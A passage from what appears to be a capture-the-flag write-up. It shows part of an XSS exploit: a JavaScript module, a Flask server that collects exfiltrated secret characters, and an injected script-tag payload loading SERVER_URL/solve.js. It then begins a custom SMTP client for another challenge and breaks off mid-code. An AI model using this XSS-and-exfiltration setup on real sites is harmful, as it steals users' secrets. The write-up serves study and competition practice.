+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;index: &#34;</span>, <span style="color:#a6e22e">index</span>, <span style="color:#e6db74">&#34;urls length: &#34;</span>, <span style="color:#a6e22e">urls</span>.<span style="color:#a6e22e">length</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (<span style="color:#a6e22e">index</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> <span style="color:#a6e22e">urls</span>.<span style="color:#a6e22e">length</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">register</span>(<span style="color:#e6db74">&#34;exploit&#34;</span>, <span style="color:#a6e22e">Exploit</span>);
+</span></span></code></pre></div><p>and hosted the server with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request, Response
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask_cors <span style="color:#f92672">import</span> CORS
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>CORS(app) <span style="color:#75715e"># I had to set the CORS, otherwise the browser would not run the JavaScript code</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>secret_data <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;&#39;</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">100</span> <span style="color:#75715e"># I first forgot how long the secret be :)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>server_url <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#39;http://localhost:5000&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/solve.js&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">solve_js</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;solve.js&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> file:
+</span></span><span style="display:flex;"><span>        js_code <span style="color:#f92672">=</span> file<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>    js_code <span style="color:#f92672">=</span> js_code<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;SERVER_URL&#39;</span>, server_url)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> Response(js_code, mimetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;application/javascript&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/module.js&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">module_js</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;module.js&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> file:
+</span></span><span style="display:flex;"><span>        js_code <span style="color:#f92672">=</span> file<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> Response(js_code, mimetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;application/javascript&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/secret&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">secret</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;secret&#39;</span>, <span style="color:#66d9ef">None</span>) <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">or</span>
+</span></span><span style="display:flex;"><span>            request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;index&#39;</span>, <span style="color:#66d9ef">None</span>) <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Missing parameters&#34;</span>, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>    secret_character <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;secret&#39;</span>)    
+</span></span><span style="display:flex;"><span>    index <span style="color:#f92672">=</span> int(request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;index&#39;</span>))
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Received secret character: </span><span style="color:#e6db74">{</span>secret_character<span style="color:#e6db74">}</span><span style="color:#e6db74"> at index </span><span style="color:#e6db74">{</span>index<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, flush<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&lt;=</span> index <span style="color:#f92672">&lt;</span> len(secret_data):
+</span></span><span style="display:flex;"><span>        secret_data[index] <span style="color:#f92672">=</span> secret_character
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Index </span><span style="color:#e6db74">{</span>index<span style="color:#e6db74">}</span><span style="color:#e6db74"> out of range&#34;</span>, flush<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Secret data updated: </span><span style="color:#e6db74">{</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(secret_data)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, flush<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;OK&#34;</span>, <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/ok&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ok</span>():
+</span></span><span style="display:flex;"><span>    index <span style="color:#f92672">=</span> int(request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;index&#39;</span>))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> index <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> index <span style="color:#f92672">&gt;=</span> len(secret_data):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Index out of range&#34;</span>, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> secret_data[index] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Secret not set&#34;</span>, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;OK&#34;</span>, <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>)
+</span></span></code></pre></div><p>And after making GET request to <code>/xss?xss=&lt;script&gt;const%20k=0;const%20j=0&lt;/script&gt;&lt;script%20src=&quot;SERVER_URL/solve.js&quot;&gt;&lt;/script&gt;</code>, I eventually got the secret and then the flag.</p>
+<h2 id="bad-chess-challenge">bad-chess-challenge<a hidden class="anchor" aria-hidden="true" href="#bad-chess-challenge">#</a></h2>
+<p>This challenge was about SMTP. Nothing about web exploitation, plain SMTP with S/MIME which made me suffer a lot. Sometimes, I could sign but then it returned invalid signature. After a lot of trials and errors, I came up with my own STMP client (a simple one, kinda insecure, but simple enough to be able to send raw data).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">net</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;net&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">EventEmitter</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;events&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">My_SMTP_Client</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">stage</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">socket</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">constructor</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">host</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">port</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">from</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">to</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">subject</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">data</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">email_parsed</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">debug</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>    ) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">host</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">host</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">port</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">port</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">from</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">from</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">to</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">to</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">subject</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">subject</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">emitter</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">EventEmitter</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">email_parsed</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">email_parsed</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">debug</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">debug</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">socket</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">createConnection</span>(
+</span></span><span style="display:flex;"><span>            { <span style="color:#a6e22e">port</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">port</span>, <span style="color:#a6e22e">host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">host</span> },
+</span></span><span style="display:flex;"><span>            () =&gt; {}
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#34;data&#34;</span>, (<span style="color:#a6e22e">data</span>) =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ret_data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">toString</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">debug</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Received data: &#34;</span>, <span style="color:#a6e22e">ret_data</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">switch</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">stage</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">ret_data</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;220&#34;</span>) <span style="color:#f92672">!==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">HELO</span>();
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">stage</span><span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">emitter</span>.<span style="color:#a6e22e">emit</span>(<span style="color:#e6db74">&#34;error&#34;</span>, <span style="color:#e6db74">&#34;[HELO] Error: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">ret_data</span>);
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">ret_data</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;250&#34;</span>) <span style="color:#f92672">!==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">MAIL_FROM</span>();
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">stage</span><span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">emitter</span>.<span style="color:#a6e22e">emit</span>(
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;error&#34;</span>,
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;[MAIL FROM] Error: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">ret_data</span>
+</span></span><span style="display:flex;"><span>                    );
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">ret_data</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;250&#34;</span>) <span style="color:#f92672">!==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">RCPT_TO</span>();
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">stage</span><span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">emitter</span>.<span style="color:#a6e22e">emit</span>(<span style="color:#e6db74">&#34;error&#34;</span>, <span style="color:#e6db74">&#34;[RCPT TO] Error: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">ret_data</span>);
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">ret_data</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;250&#34;</span>) <span style="color:#f92672">!==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">DATA</span>();
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">stage</span><span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">emitter</span>.<span style="color:#a6e22e">emit</span>(<span style="color:#e6db74">&#34;error&#34;</span>, <span style="color:#e6db74">&#34;[DATA] Error: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">ret_data</span>);
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">ret_data</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;354&#34;</span>) <span style="color:#f92672">!==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">send_DATA</span>();
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">stage</span><span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">emitter</span>.<span style="color:#a6e22e">emit</span>(
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;error&#34;</span>,
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;[SEND DATA] Error: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">ret_data</span>
+</span></span><span style="display:flex;"><span>                    );
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">ret_data</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;250&#34;</span>) <span style="color:#f92672">!==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ret</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ret_data</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/250[-\s]/g</span>, <span style="color:#e6db74">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">end</span>();
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">ret</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ret</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">emitter</span>.<span style="color:#a6e22e">emit</span>(<span style="color:#e6db74">&#34;data&#34;</span>, <span style="color:#a6e22e">ret</span>);
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">emitter</span>.<span style="color:#a6e22e">emit</span>(
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;error&#34;</span>,
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;[RECV DATA] Error: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">ret_data</span>
+</span></span><span style="display:flex;"><span>                    );
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Unknown stage&#34;</span>);
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#34;error&#34;</span>, (<span style="color:#a6e22e">err</span>) =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">emitter</span>.<span style="color:#a6e22e">emit</span>(<span style="color:#e6db74">&#34;error&#34;</span>, <span style="color:#a6e22e">err</span>);
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#34;end&#34;</span>, () =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">emitter</span>.<span style="color:#a6e22e">emit</span>(<span style="color:#e6db74">&#34;end&#34;</span>);
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">on</span>(<span style="color:#a6e22e">event</span>, <span style="color:#a6e22e">handler</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">emitter</span>.<span style="color:#a6e22e">on</span>(<span style="color:#a6e22e">event</span>, <span style="color:#a6e22e">handler</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#a6e22e">HELO</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">socket</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#34;Socket not initialized&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">`HELO </span><span style="color:#e6db74">${</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">host</span><span style="color:#e6db74">}</span><span style="color:#e6db74">\r\n`</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#a6e22e">MAIL_FROM</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">socket</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#34;Socket not initialized&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">`MAIL FROM:&lt;</span><span style="color:#e6db74">${</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">from</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&gt;\r\n`</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#a6e22e">RCPT_TO</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">socket</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#34;Socket not initialized&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">`RCPT TO:&lt;</span><span style="color:#e6db74">${</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">to</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&gt;\r\n`</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#a6e22e">DATA</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">socket</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#34;Socket not initialized&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">`DATA\r\n`</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#a6e22e">send_DATA</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">socket</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#34;Socket not initialized&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>        }
